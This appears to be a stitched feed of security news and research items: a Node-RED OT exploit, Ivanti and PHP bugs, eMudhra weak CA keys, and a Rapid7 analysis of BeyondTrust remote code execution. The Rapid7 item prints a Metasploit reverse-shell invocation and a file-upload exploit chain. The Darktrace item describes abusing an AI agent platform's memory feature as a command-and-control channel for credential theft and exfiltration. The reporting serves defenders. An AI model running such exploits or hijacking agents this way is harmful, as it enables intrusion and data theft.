Title: Max-severity bug in widely used OT programming tool exploited to deliver Linux malware
Context: Unknown criminals are exploiting a maximum-severity vulnerability in Node-RED, a flow-based programming tool that is widely used in critical infrastructure, to deploy a flow...
Full Text: Unknown criminals are exploiting a maximum-severity vulnerability in Node-RED, a flow-based programming tool that is widely used in critical infrastructure, to deploy a flow that downloads and runs a Linux bot. Node-RED is commonly used for workflow automation in industrial control systems (ICS) and operational technology (OT) environments. It’s built on top of Node.js and is used in commercial products including Siemens SIMATIC IoT2050. In August, Siemens assigned the vulnerability identifier – CVE-2026-58115 – to describe the bug and explain its perfect 10-out-of-10 CVSS rating. Affected Siemens devices do not enforce authentication on the Node-RED HTTP interface, allowing unauthenticated access to programming nodes that can execute system commands on the device. This means unauthenticated remote attackers can create malicious flows, which is what VulnCheck researchers began documenting last Friday. “On October 30, 2026, one of our canaries caught an attacker exploiting CVE-2026-58115,” VulnCheck researcher Patrick Garrity warned in a Monday advisory, adding that two Node-RED built-in nodes make this vulnerability “trivial to weaponize.” One is an inject node, which fires a message either on a schedule or once at startup. The second, an exec node, can run shell commands. “Wire one to the other and the flow executes a command as soon as it is deployed, with no further interaction,” Garrity said. Plus, these exploits come as criminals increasingly look to target internet-exposed OT and ICS devices, allowing their cyberattacks to impact the physical world and produce real-life harm. Case in point: the ongoing refrigeration controller hacks across Europe and the attacks on water systems across at least 12 US states over the summer. The activity observed by VulnCheck came from a single IP address, 4.201.105[.]116, which sits in Microsoft’s AS8075 network and geolocates to Brazil. “It didn't just scan us. It sent the complete exploit, flow and dropper, in a single POST /flows,” Garrity wrote. While there’s a lot that the researchers don’t yet know about the attacks - they didn’t retrieve a binary or staged scripts to analyze - the filename, bot-linux-amd64, indicates that the malware targets Linux running on AMD64 processors. It also suggests the malware operator may have other builds. “We did not fetch the binary, so we can't say what it does once running,” Garrity noted. Between October 30 and November 1, the researchers saw this IP address target the same Node-RED vulnerability 16 times, and log 125 hits against eight different CVEs across their wider canary network. Among the targets of the attack were a seven-year-old Apache Solr flaw tracked as CVE-2019-17558 – affecting Camunda, Gitea, MLflow, Traefik, and Joomla, alongside Node-RED. All this suggests “opportunistic mass scanning rather than a targeted attack,” according to the researcher. One of these hits delivered a different payload pointing to a separate server (85.215.73[.]250), which VulnCheck now tracks - but doesn’t have any telemetry other than the URL. “Because the download host is a different machine from the one that sent the exploit, the likely setup is a scan-and-infect arrangement: the hosts that find and exploit vulnerable instances pull the implant from a separate, dedicated server,” Garrity wrote. The mix of old and new bugs across unrelated products indicates “opportunistic mass scanning rather than a targeted attack,” Garrity wrote. “If you run Node-RED anywhere, including inside OT environments, check today whether it’s reachable from outside your network, apply updates where available and implement detections to reduce the risk of exploitation,” he added in a LinkedIn post. While the bug has been added to VulnCheck’s Known Exploited Vulnerabilities (KEV) catalog, it hasn’t appeared (as of press time) in the US Cybersecurity and Infrastructure Security Agency’s KEV.®

Some 88% of the critical and high-severity weaknesses found in live attack tests on enterprise environments this year would not have been identified through vendor advisories or other outside sources, new data has suggested.

The figure comes from a report published on November 2 by Armadin, the offensive security startup launched by Mandiant founder Kevin Mandia, based on AI-driven attacks against its clients' live systems.

The clients span nearly a dozen industries, but Armadin did not disclose how many organizations or findings the data covers.

Read more on exposure management: AI Threats and Alert Fatigue Challenge Cybersecurity Teams

Most Severe Findings Sat Beyond Advisories and Logins

Defects in software the clients had written themselves made up 67% of the critical findings and 78% of the high findings that advisories could not cover. Vendor products deployed in ways no advisory describes, such as administrative consoles exposed to the internet, accounted for 24% and 22%.

The remaining 9% of critical findings, and under 1% of high ones, were zero-days Armadin found itself, including one in an identity governance platform whose vendor took almost four months to issue an advisory.

Nearly 70% of critical and high findings sat on the unauthenticated attack surface. Of the documented attack chains, 82% began without credentials, and 56% of those went on without a password or key ever being presented.

In more than 70% of client environments, Armadin said it reached a critical outcome in three steps or fewer without valid credentials.

Exposed Service Accounts Created Further Attack Paths

Just under half of the chains that started without authentication relied on an exposed credential, 71% of which belonged to applications or service accounts rather than people. Nearly 90% were reachable without extraction, often in repositories, configuration files, backups, logs or cloud settings.

In one engagement, Armadin started from an unprivileged domain account and used a flaw in backup software to read the credentials it held. That led to a hypervisor management server and, via a domain controller backup, to domain administrator hashes.

Fixing the severe findings meant shipping application code in 51% of cases, changing a setting, permission or policy in 43% and rotating an exposed credential in 32%, with many needing more than one step.

Armadin's recommendations included policies for provisioning, storing and rotating service account credentials, and checks of pipelines and code repositories for exposed secrets.

By its count, 93% of severe findings needed no third party to act, leaving the fix in each organization's own hands.

@ Jeff, ALL,

With regards,

“More bugs aren’t necessarily being found because there’s more of them being created than before, the more likely explanation is that the bugs were already there and now we’re closing them at the fastest pace in history! “

Actually both points are true…

Yes we are finding “new instances of bugs from known classes of bugs” at a much higher rate.

But that does not mean we are finding “new classes of bugs” (ie black swans).

But also “vibe coding” by AI is certainly generating “new instances of bugs” at a more alarming rate.

It’s why quite a few employers are now seeing “laying off humans with AI” as being not just horrifically unprofitable, but extremely dangerous to the business.

Yes, AI has niche advantages, but those niches are invariably not general in nature.

Even China is begining to see the dangers of even low cost AI.

None of this was unpredictable and quite a few have called it that way. However when you’ve handed over everything for a few tulip bulbs you had better be sure not only are they going to grow but that people are going to by the result sufficient to pay a “Return on Investment”(ROI).

Right now the ROI in “General AI” is not a certainty or even a likely hood based on the current economy…

Then there is “clearing up the mess of harms” the rush for AI has created… How many billions if not trillions that is going to cost companies that are already by normal forecasting methods “bankrupt”…

Title: Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)
Context: Ivanti rates CVE-2026-111357, a missing authentication for critical function vulnerability (CWE-306), with a CVSSv3
Full Text:
Overview

On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357, a missing authentication for critical function vulnerability (CWE-306), with a CVSSv3.1 score of 8.8; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527, classified as generation of predictable numbers or identifiers (CWE-340), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry, allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk.

Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935, an authentication bypass by spoofing (CWE-290). Rapid7 covered the original disclosure on October 13, 2026, when a fix for CVE-2026-104935 was available but the privilege escalation component remained unpatched. Fixes are now available for all three vulnerabilities.

On October 30, 2026, CVE-2026-111357 and CVE-2026-118527 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation.

In its investigation, Volexity reports that UTA0576 used an exploit chain to gain unauthenticated root access to an appliance running 22.8R2.4, beginning on October 3, 2026. Its write-up identifies CVE-2026-104935 and CVE-2026-111357; Ivanti's updated advisory identifies CVE-2026-118527 as an additional component of the chain. Volexity observed credential theft and Active Directory queries for Windows LAPS passwords and BitLocker recovery keys.

The combined impact warrants emergency remediation despite the individual CVSS ratings. Ivanti Connect Secure is an enterprise VPN solution deployed at the network edge and has a history of zero-day exploitation, including in 2024 and 2025.

Rapid7 recommends applying the available updates on an emergency basis outside of normal patching cycles. The October 13 fixes in 25.1.1.2 and 22.8R2.5 do not remediate CVE-2026-111357 or CVE-2026-118527.

Title: PHP Vulnerabilities, ARTEX & AI-Powered Cyber Attacks
Context: [2] While Darktrace has not observed direct evidence of CVE-2026-109618 or CVE-2026-109619 exploitation, on October 21st we observed a six-month high in detections consistent...
Full Text:
The disclosure of CVE-2026-109618 and CVE-2026-109619 placed immediate pressure on organizations running PHP. Both vulnerabilities can allow unauthenticated remote code execution, including in products and appliances where PHP is embedded, and updates depend on third-party vendors [1].

Early guidance focused on patching internet-facing systems and monitoring for behavior associated with successful exploitation, including unexpected command execution, Webroot changes and outbound connections from PHP servers.

Darktrace observed widespread scanning across monitored environments involving hundreds of distinct source IP addresses that public reporting has associated with activity targeting the PHP vulnerabilities. The volume of scanning was significantly greater than the evidence available for successful exploitation. For analysts, that distinction is important. Scanning demonstrates interest in exposed infrastructure; establishing compromise requires evidence of subsequent behavior on the targeted system, including command execution, file modification or unexpected outbound communication.

PHP is not an isolated example. Imperva subsequently demonstrated remote code execution against a vulnerable Node.js build through malicious Brotli data, reproducing execution through compressed HTTP responses and configured request parsers. The same inputs were rejected by the patched runtime. Imperva linked its Node2Shell and PHP2Shell research to the increasing speed of vulnerability discovery and exploit development. [2]

While Darktrace has not observed direct evidence of CVE-2026-109618 or CVE-2026-109619 exploitation, on October 21st we observed a six-month high in detections consistent with zero-day exploitation activity, representing a 64% increase compared to historic data. This increase has not been confirmed as related to the PHP vulnerabilities. Darktrace’s behavioral approach is designed to detect anomalous activity without relying solely on rules written for a specific exploit. Comparable increases were observed around the Log4j disclosure and other globally significant vulnerability disclosures.

AI-assisted vulnerability research

The PHP disclosure arrives as AI systems have become more capable at vulnerability research [3]. OpenAI launched Daybreak in June 2026, combining GPT-5.5-Cyber, Codex Security and partnerships with security researchers and software maintainers. OpenAI says its models have been applied to discovering and generating patches for vulnerabilities in browsers, network infrastructure, FreeBSD and the Linux kernel. Darktrace joined the OpenAI Daybreak Cyber Partner Program in June to explore how OpenAI's cyber capabilities could be integrated within Darktrace products and services [4][10].

OpenAI reported in August that Codex Security Cloud had analyzed more than 30 million commits across more than 30,000 codebases. According to OpenAI, Cloudflare uses models accessed through Daybreak to investigate customer-authorized code and combines findings with live traffic and security signals to assess whether affected routes are active or receiving suspicious traffic, with proposed mitigations and patches remaining subject to customer review [5][6].

Faster discovery still leaves defenders with the work of locating affected software, testing fixes and completing remediation. The PHP case shows that gap clearly, particularly when vulnerable runtimes are embedded inside other products.

Enterprise agents as an attack surface

Darktrace Signal Labs has also examined how a trusted enterprise agent could be abused after an attacker has already obtained access to an environment. In a controlled simulation, researchers demonstrated that, in that post-compromise scenario, the Claude platform’s memory stores feature could be abused to establish a live C2 channel between an external operator and internal Claude Code agents. The external operator was able to dynamically assign network discovery, credential access, and data exfiltration tasks to the agents via this C2 channel. Detection of the agents’ activities relied on the correlation of process creation and network traffic activity from agent harness processes, alongside behavioral analysis to identify deviations from expected behavior. Darktrace has not claimed it observed this memory-store command-and-control technique in operational attacks [7].

AI-assisted attacks in Japan

Evidence from Japan indicates AI being used for vulnerability scanning and attacks outside controlled research. On 21 October, JPCERT/CC published findings from an investigation into recent unauthorized access incidents affecting organizations in Japan. JPCERT/CC states that it confirmed attackers had used AI to scan for known vulnerabilities and conduct attacks through APIs. According to JPCERT/CC, its examination of attack infrastructure found evidence of Android application analysis, API discovery and testing for weaknesses including server-side request forgery, and the infrastructure also targeted services intended for users outside Japan [8].

JPCERT/CC does not identify ARTEX by name in that publication. The named ARTEX attribution comes from separate investigations, including Microsoft's analysis of Storm-0940.

AI in offensive operations

Microsoft describes ARTEX as an open-source, multi-agent penetration-testing system capable of automating activity with limited human interaction. Microsoft reported that Storm-0940, which it assesses to be a China state-aligned actor active since 2021, used ARTEX against hundreds of organizations, and Microsoft attributed the ConnectWise supply-chain compromise [9].

Microsoft observed ARTEX accelerating scanning, reconnaissance, password spraying and OAuth application abuse. Several ARTEX-driven operations reached privileged cloud access less than three hours after initial targeting. Following the ConnectWise compromise, Storm-0940 attempted to authenticate to more than 2,250 tenants at rates of up to 2,900 attempts per minute [9].

Darktrace Threat Research found activity in its own telemetry involving infrastructure later associated with the campaign. On 13 October, Darktrace recorded failed authentication activity involving 144.172.64[.]128, one of the addresses Microsoft later identified as performing sign-ins and Microsoft Graph activity in ConnectWise customer environments. Darktrace analysis identified 65 failed authentication attempts in around 20 minutes.

The telemetry establishes repeated failed authentication from infrastructure later associated with the campaign. It does not establish ARTEX execution or successful compromise. At the time of observation, Microsoft's later attribution was unavailable. Analysts therefore had the behavior itself: repeated failed authentication from the same source over a short period, together with any related identity, application or network activity inside the environment.

Microsoft documented a wider password-spray campaign against 327 accounts across eight organizations between 10 and 14 October. It recorded more than 151,000 failed logons, including more than 111,000 on 11 October, but no successful authentication, token issuance, Graph call or directory change from that campaign. Microsoft also reported that most Storm-0940 targeting was unsuccessful [9].

Where the actor progressed beyond authentication, Microsoft observed service-principal sign-ins followed by Graph and directory operations. Activity included reconnaissance, application credential changes and attempts to modify privileges. Microsoft recommends correlating service-principal sign-ins with Graph activity, directory changes and resource access [9].

Behavior before attribution

The PHP and ARTEX cases begin with different information. PHP defenders knew which software required urgent remediation but initially had limited information about exploitation. Process execution, file modification and outbound communication could still provide evidence of compromise.

The PHP and ARTEX observations also illustrate the difference between volume and impact. Darktrace observed broad scanning around the PHP disclosure, while the ARTEX-associated infrastructure produced concentrated authentication activity. Neither observation independently demonstrates compromise and in each case examining the behavior that follows the initial interaction is the investigative clue.

The Darktrace ARTEX-related observation began with authentication behavior. Microsoft publicly attributed the source infrastructure eight days later. That attribution added context, but it did not change what had originally been recorded in the environment.

AI is now present at several points in this cycle. Daybreak applies models to vulnerability discovery and remediation. Darktrace Signal Labs demonstrated how a trusted enterprise agent could be co-opted in a controlled environment. JPCERT/CC confirmed AI-assisted vulnerability scanning and API attacks in recent incidents. Microsoft documented ARTEX being used by Storm-0940 in active operations [4][7][8][9].

Microsoft's findings also show why scale and impact must be assessed separately. One ARTEX-associated campaign produced more than 151,000 failed logons without successful access, while other operations reached privileged cloud access in less than three hours. Security teams have to distinguish high-volume attempts from activity that progresses through authentication, privilege changes and resource access.

The evidence required to assess these cases remains familiar: authentication records, process execution, application and directory changes, file activity and network communication. AI can increase the rate at which those behaviors occur. Defenders still need to establish their sequence and impact.

Title: 4 real? Tracking exploitation and patching of eMudhra’s weak keys
Context: While there have been plenty of compromised certification authorities in the past (such as DigiNotar, TÜRKTRUST, and TrustWave), access to their keys has always been contained...
Full Text:
On October 19, 2026, we learned about eMudhra’s eight shockingly weak keys: where eMudhra was trusted to pick a 115-digit number for their virtual combination lock protecting the Internet, they picked the number 4. Not even four digits, just the number 4. The other seven keys were similarly weak: 56, 66, 115, 155, 156, 230 and 237.

The next day, we wrote a blog post on the immediate action we took to mitigate this leak, and what customers needed to do on their end to stay secure. Now, we are sharing a more in-depth follow up on the evidence we’ve seen of exploitation, and the progress seen on visitors patching their systems.

Let's start with the scale of the problem. A certificate authority (CA) with weak keys this serious is unprecedented, and the potential consequences are significant. While there have been plenty of compromised certification authorities in the past (such as DigiNotar, TÜRKTRUST, and TrustWave), access to their keys has always been contained to a degree; these incidents gave a limited set of attackers or organizations the ability to issue fraudulent certificates. The eMudhra incident is fundamentally different; the affected intermediate private keys could be recovered almost instantly by anyone from the public certificates themselves. Anyone can independently recover these same signing keys and create certificates for any domain that an unpatched client not enforcing Certificate Transparency would accept.

eMudhra announced they’re exiting the public CA business and have claimed a mistake in a key generation script, but have not yet shared the script. They signed a certificate revocation list (CRL) with what might’ve been a correctly generated key, and subsequently corrected it to be signed with the weak key.

How did that come to be and why didn’t that set off alarms? Much has to be cleared up, including the role of the auditors and cross signers. This blog proposes the fixes and next steps for organizations to ensure they are secure.

Patching Cloudflare

Our primary concern remains the security impact on Cloudflare, our customers, and the Internet as a whole. At the time of writing, all high priority Cloudflare systems have been patched. A small number of confirmed low impact tickets is being worked on.

We started patching high-impact systems immediately on October 19. These included customer origin-facing proxies using Pingora, responsible for most of our outbound connections. These were patched in hours to reject the vulnerable eMudhra keys. At the same time, we started an AI-assisted analysis of our source code to find all other systems that trust these weak keys. Within four hours we had a full analysis. We assigned a ticket with preliminary analysis for each system, and asked the team to confirm and/or adjust the analysis before the end of the day. Where high impact was identified, we asked to patch immediately, and for the lower impact, remediation was due at the end of last week.

Has Cloudflare seen exploitation across its network?

To track whenever a customer’s server (or attacker) presents a certificate signed by eMudhra’s weak keys, we added logging to Pingora. As this outbound service accounts for the vast majority of outgoing TLS connections from a Cloudflare machine, any attacker attempting to snoop using the eMudhra keys would trigger this logging. The logging finished rolling out October 21.

At the time of writing, a week later, we’ve seen about 22,000 attempted handshakes with the weak eMudhra keys. Two-thirds of the attempts were fetches of test sites such as emudhra.we-have-a-problem.com (which we mentioned in the developer guidance in our earlier post). Almost all of the remaining third went to origins who appeared to set up a certificate for themselves using the weak intermediate. Every handshake configured to verify the certificate was refused, as we already patched.

About 160 of these handshakes stood out: the certificates’ Subject Alternative Names (SANs) were naming other organizations’ domains, unrelated to the Server Name Indication (SNI) requested in the handshake. Some of those names were domains related to consumer IoT devices. We noticed as well that those forged certificates were made after the keys leaked and some were valid for over two years, longer than any public CA may issue. However, these certificates looked like the servers' own default certificates rather than part of an attempt to intercept our connections. They named domains other than the ones being connected to, so they would have failed hostname verification anyway. And in several cases, a server presented the same certificate to connections from many of our locations, which means it came from the server itself rather than from something on a single network path.

Thus while there is no evidence of the weak keys being used to intercept Cloudflare's connections so far, these keys appear to have been used to forge certificates within hours of the weakness becoming public: one of the forged certificates we saw was dated October 20 at 18:19 UTC, less than an hour after Mozilla's bug report was made public. This does not exclude carefully targeted interception. For that we have to rely on the usual indirect signals of system compromise — and so far, we have not seen any such signals.

How many visitors are still vulnerable?

So much about patching Cloudflare, but what about our visitors? We cannot directly test whether a visitor still trusts the weak keys without breaking connections, so we have to do something more indirect. For that we used our challenge pages:

We rolled out an update to send out two probe connections on a fraction of challenge pages: one probe to ca1.cloudflarecaptcha.com and one to ca2.cloudflarecaptcha.com. Initially we installed an eMudhra signed certificate on ca1.cloudflarecaptcha.com and a regularly signed certificate on ca2.cloudflarecaptcha.com as control. Then we record whether these probes succeeded. This allows us to see if visitors that are served a challenge page still trust the weak eMudhra keys.

What did we find? With 50 million probes over the last week, we see this:

Big caveat upfront: by design the traffic to these challenge pages is highly skewed. There are many (unconfirmed) bots in there. Also, only clients that execute JavaScript (like browsers) will send probes.

The jump in the data is due to the following changes—all times are UTC:

October 23 15:30, we changed our control endpoint to also serve an eMudhra certificate, but this time without signed certificate timestamps (SCTs). There were some differences in acceptance, but not large. We could’ve added a new endpoint, but that would’ve required a slow release of our challenge platform. Changing the endpoint was easier.

October 23 16:30, our challenge platform rolled back to a previous version because of an unrelated issue. The probes returned October 27 at 10:00.

October 27 16:37, we noticed we did not send the G3 cross-sign, which not all clients knew about, and added it to both endpoints. We removed SCTs from both.

October 27 16:49, we switched ca2 to chain up to the AAA Certificate Services root.

October 27 18:18, we ramped up probes to be included from 1% to 10% of all challenge pages served on non-paying customer zones.

With those caveats out of the way: what do we notice? Up-to-date modern browsers are mostly patched, but bots and old browsers are not. Also embedded browsers, like Android WebView, lag behind patching with 30–40% still accepting. Over the first weekend (with the monitoring gap), we see clear evidence of patching, but afterwards we see little movement.

On October 29 around 18:00 UTC, we released a detection that caught a large influx of bot traffic identifying as Chrome 150-154 on macOS. This can look like patching in the top graph, but it is actually a change in traffic classification: the same user agents show a corresponding increase in acceptance among traffic with bot signals detected in the bottom graph.

Chrome 150-154 on Linux is the notable exception: its acceptance continues to decline, consistent with further patching in that cohort. Given the bot-heavy and changing traffic mix, that evidence is suggestive rather than conclusive. Otherwise, we still see little movement.

Breaking down by network (ASN) we see:

Across the large networks, more than half of probes still accept the compromised chain, both among traffic with no bot signals detected (top graph) and traffic with bot signals detected (bottom graph). Over the weekend we saw some patching, but afterwards the trend has been flat.

The big caveat still holds: traffic is skewed by (unconfirmed) bots. But bots are also just software that need security updates. And if they’re in any way representative of overall software updates, then the picture is quite dire indeed.

What can you do?

Patch! Dennis Jackson has a great crowdsourced website with instructions. Especially if you’re a developer on macOS, you want to follow these instructions. If you’re a Cloudflare customer, check out last week’s blog post on what needs to be done on your end when using certain products like WARP or Tunnel.

Looking ahead

At Cloudflare, we have a quick-revocation mechanism in place in some products. To bring it to more systems at Cloudflare and industry, we’re excited about projects like upki that understand a trust store can’t be a static list of root certificate authorities, but needs the ability to be quickly updated with information like revocation and certificate transparency keys. As vulnerabilities are discovered at a faster pace than ever, it is vital that they can be addressed quickly and effectively.

Title: Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)
Context: Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user
Full Text:
Overview

An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required.

The flaw sits between the internal message router, brain, and an appliance-side customer worker, thin-scc. An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider.

We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets.

We tested Remote Support 24.1.2, build 1524046, revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3. The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0, is separate from the Remote Support application version.

Impact

The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload

On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser, UID 1000, which establishes unauthenticated remote code execution as the site user.

Technical Analysis

We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution.

Addresses use Ghidra image base 0x100000. Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available.

Starting an anonymous customer session

We begin by obtaining two customer keys from POST /api/start_session. These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. From file upload to PHP execution

The next step is to choose a writable location that the web server would execute. The supplied config/apache_vhost.conf sets the document root to:

/home/msfuser/ingredi-24.1.2/app/www/public

An absolute upload into that directory succeeded. There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why.

source/app/www/public/.htaccess:

# ... omitted: application routes and compatibility rewrites ... RewriteCond %{THE_REQUEST} "^[^ ]* .*?\.php[?/ ].*$" # [I1] Direct .php URLs return 404. RewriteRule .* - [L,R=404] # ... omitted: download-helper routes ... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\.php -f # [I2] An extensionless URL executes the existing PHP file. RewriteRule ^(.+)$ $1.php [L]

The rule at [I1] rejects a direct .php request. The rule at [I2] maps an extensionless URL to an existing PHP file.

Requesting the uploaded basename without .php executed our payload. It returned its absolute filename, EUID 1000, and the output of id.

We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles. On this appliance, it contains:

BG_app_root=/home/msfuser/ingredi-24.1.2 BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock

BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size.

Exploit

The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed.

The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP.

For a PHP Meterpreter payload, the basic configuration is:

use exploit/linux/http/beyondtrust_rs_mrs_file_upload set RHOSTS 192.168.1.98 set TARGET 0 set PAYLOAD php/meterpreter/reverse_tcp set LHOST 192.168.1.68 run verbose=true

Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp. The module documentation covers the directory override and other options.

Brain connection records

brain.log helps link the activity to a client address. These two entries preceded the same module run:

20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0' 20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'

These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves.

Where to collect the native logs

The aggregated logs are under $BG_app_root/log/. While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/. The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session.

The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0. No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info, so enabling its debug output alone would not guarantee detailed message payloads.

Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events

Title: L’Italia è afflitta da vulnerabilità informatiche, senza una causa chiara
Context: Ora, però, confrontiamole con i dati di Intel471 tratti dal suo rapporto “2026 Cyber Threat Trends & Outlook”: A livello globale nel 2025, gli IAB hanno preso di mira gli...
Full Text:
Read in English: Click here

Translation provided by Dark Reading's internal AI translation tool.

Secondo nuovi dati, l’Italia è vittima di un numero sproporzionatamente elevato di attacchi informatici. Non solo: le tipologie di attacchi che colpiscono le organizzazioni nel Paese sono molto diverse da quelle che colpiscono altre località. I ricercatori avanzano tre teorie per spiegarne il motivo.

È vero che alcune regioni e alcuni paesi sono esposti a un rischio informatico maggiore a causa di fattori economici, militari e politici. Israele è una calamita per gli hacktivisti e per le minacce persistenti avanzate (APT) regionali, legate agli Stati. La storia unica del Brasile lo rende un vero e proprio alveare di trojan bancari. L’economia degli Stati Uniti attirerà sempre la massima attenzione da parte dei truffatori. Non è però così ovvio il motivo per cui l’Italia sia un bersaglio così popolare per i criminali informatici.

Related:Cyber Vulnerabilities Besiege Italy, Absent Clear Cause

«Uno dei motivi principali per cui abbiamo deciso di esaminare il panorama delle minacce in Italia è che il Paese continuava a comparire in cima alle nostre statistiche nei rapporti interni mensili», afferma Gianluca Tiepolo, analista di criminalità informatica presso Intel471. In un rapporto condiviso in esclusiva con Dark Reading prima della sua pubblicazione, Intel471 ha rilevato che l’Italia rappresenta un vero e proprio caso a sé stante nel panorama globale delle minacce informatiche. Le organizzazioni italiane subiscono attacchi a un ritmo ben superiore a quanto ci si potrebbe ragionevolmente aspettare, considerando le dimensioni del Paese, la sua economia e la sua situazione politica. Inoltre, gli attacchi sfruttanti le vulnerabilità e le infrastrutture web sono molto più comuni in Italia che altrove.

«Volevamo capire cosa fosse alla base di quelle statistiche», afferma Tiepolo. Alla fine, però, i dati dipingono un quadro quasi inspiegabile di ciò che sta accadendo nella terra della pasta e del Chianti.

Dati inspiegabili dal panorama delle minacce in Italia

L’Italia è il 25° Paese più grande al mondo ma, secondo questi nuovi dati, le sue organizzazioni rappresentano circa il 7% di tutti i dati di accesso iniziale venduti sui forum dei criminali informatici. A livello globale, è seconda solo agli Stati Uniti (30%). L’Italia si colloca inoltre al quarto posto tra i Paesi più presi di mira dal ransomware.

Ancora più strani sono i tipi di intrusioni informatiche che colpiscono le organizzazioni in Italia. Secondo i nuovi dati, gli initial access broker (IAB) hanno ottenuto il loro primo punto d’appoggio sfruttando vulnerabilità nel 57% dei casi. Le credenziali hanno spiegato solo il 23% dei casi. Nel frattempo, gli IAB hanno venduto l’accesso all’infrastruttura web di proprietà delle vittime nel 49% dei casi, con strumenti di accesso remoto e desktop remoto che rappresentano il 26% dei casi.

Related:Aussies Face Reduced Cybercrime Risk, as Pressure Shifts to SMBs

E allora? Forse queste cifre non saltano all’occhio. Ora, però, confrontiamole con i dati di Intel471 tratti dal suo rapporto “2026 Cyber Threat Trends & Outlook”:

A livello globale nel 2025, gli IAB hanno preso di mira gli strumenti di accesso remoto e di desktop remoto nel 67% dei casi — il 41% in più, in termini relativi, rispetto all’Italia. Nel frattempo, l’infrastruttura web — di gran lunga la risorsa più a rischio in Italia — rappresentava una frazione talmente esigua dei dati globali di Intel471 che l’azienda non si è nemmeno preoccupata di citarla nel proprio rapporto.

Allo stesso modo, secondo i dati globali dell’azienda, gli attacchi basati sulle credenziali sono oggi, in generale, otto volte più comuni di qualsiasi altro tipo di attacco. È emerso che il 49% delle inserzioni su IAB indicava le credenziali come tipo di attacco, rispetto al 23% dei dati specifici per l’Italia. E, cosa davvero esilarante, mentre in Italia rappresentano circa il 57% di tutti gli attacchi, le vulnerabilità sfruttate sono emerse solo nel 6,5% dei casi a livello globale.

Related:Europe Evolves Into Ransomware's Favorite Region

Teoria n. 1: scarsa igiene della sicurezza informatica

Sebbene i dati sulla sicurezza informatica possano essere interpretati in modi diversi a seconda delle circostanze, l’Italia sembra davvero una sorta di “unicorno” del rischio informatico, afferma Tiepolo, aggiungendo che l’Italia è ormai da tempo in ritardo in termini di preparazione informatica.

«Sono italiano», dice. «Ho lavorato con molti clienti italiani diversi. Quello che posso dire è che l’Italia è probabilmente leggermente indietro rispetto ad altri paesi europei, semplicemente in termini di [adozione delle] tecnologie di sicurezza. Ad esempio, le tecnologie di rilevamento e risposta sugli endpoint (EDR) sono diventate popolari in Italia intorno al 2020–2021. Prima del 2020, la maggior parte delle aziende italiane non utilizzava la tecnologia EDR. Quindi, forse storicamente, l’Italia è un po’ indietro nell’investire effettivamente in prodotti e tecnologie di sicurezza informatica».

